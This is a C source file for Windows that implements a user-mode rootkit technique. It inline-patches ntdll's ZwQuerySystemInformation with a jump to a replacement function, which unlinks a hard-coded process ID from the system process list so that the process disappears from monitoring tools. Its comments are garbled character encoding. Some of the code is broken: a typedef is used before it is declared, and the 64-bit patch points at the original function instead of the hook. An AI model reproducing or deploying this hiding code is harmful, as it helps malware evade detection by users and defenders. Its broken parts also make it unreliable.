//��������
#include <Windows.h>
#include <winternl.h>

BYTE g_OldData32[5] = { 0 };
BYTE g_OldData64[12] = { 0 };
pfnZwQuerySystemInformation fnZwQuerySystemInformation = NULL;

typedef NTSTATUS (WINAPI* pfnZwQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

NTSTATUS WINAPI My_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{

	DWORD dwHidePid = 1124;	//1.Ҫ���صĽ���ID
	UnHook();
	// ����ԭ����
	NTSTATUS status = fnZwQuerySystemInformation(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);
	// �ж�
	if (NT_SUCCESS(status) && 5==SystemInformationClass)
	{
		PSYSTEM_PROCESS_INFORMATION pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		PSYSTEM_PROCESS_INFORMATION pPrev = NULL;
		while (TRUE)
		{			
			//�ж�PID�Ƿ������ؽ���
			if (dwHidePid == (DWORD)pCur->UniqueProcessId)
			{
                  //pPrev -- ָ��ǰһ��
                  //pCur  -- ָ��ǰ
                  //pNext -- ָ����һ��
				//�ҵ����ؽ���,���������Ϣ,����pPrev��NextEntryOffset�ֶθ�ΪpNextƫ��
				if (0==pCur->NextEntryOffset && pPrev)
				{
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			}
			else
			{
				pPrev = pCur;
			}
			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCur + pCur->NextEntryOffset);
		}
	}
	HookAPI();
	return status;
}


void HookAPI()
{
	// 1.��ȡNtdll�е�ZwQuerySystemInformation������ַ
	HMODULE hNtdll = ::GetModuleHandleA("ntdll.dll");
	fnZwQuerySystemInformation = \
		(pfnZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	if (!fnZwQuerySystemInformation)return;
	// 2.�޸ĵ�ַ
#ifndef _WIN64
	BYTE pData[5] = { 0xE9 };
	DWORD dwOffset= (DWORD)My_ZwQuerySystemInformation - (DWORD)fnZwQuerySystemInformation - 5;
	::RtlCopyMemory(&pData[1], &dwOffset, sizeof(dwOffset));
	//����ǰ5�ֽ�����
	::RtlCopyMemory(g_OldData32, fnZwQuerySystemInformation, 5);
#else
	BYTE pData[12] = { 0x48,0xB8,0,0,0,0,0,0,0,0,0x50,0xC3 };
	ULONGLONG dwDestAddr = (ULONGLONG)fnZwQuerySystemInformation;
	::RtlCopyMemory(&pData[2], &dwDestAddr, sizeof(dwDestAddr));
	//����ǰ12�ֽ�����
	::RtlCopyMemory(g_OldData64, fnZwQuerySystemInformation, 12);
#endif
	// 3.����ҳ�����Կɶ���д��ִ��
	DWORD dwOldProtect = 0;
	VirtualProtect(fnZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, 
		&dwOldProtect);
	::RtlCopyMemory(fnZwQuerySystemInformation, pData, sizeof(pData));
	VirtualProtect(fnZwQuerySystemInformation, sizeof(pData), dwOldProtect,
		&dwOldProtect);
}
void UnHook()
{
	DWORD dwOldProtect = 0;
#ifndef _WIN64
	VirtualProtect(fnZwQuerySystemInformation, sizeof(g_OldData32), PAGE_EXECUTE_READWRITE,
		&dwOldProtect);
	::RtlCopyMemory(fnZwQuerySystemInformation, g_OldData32, sizeof(g_OldData32));
	VirtualProtect(fnZwQuerySystemInformation, sizeof(g_OldData32), dwOldProtect,
		&dwOldProtect);
#else
	VirtualProtect(fnZwQuerySystemInformation, sizeof(g_OldData64), PAGE_EXECUTE_READWRITE,
		&dwOldProtect);
	::RtlCopyMemory(fnZwQuerySystemInformation, g_OldData64, sizeof(g_OldData64));
	VirtualProtect(fnZwQuerySystemInformation, sizeof(g_OldData64), dwOldProtect,
		&dwOldProtect);
#endif
	
}
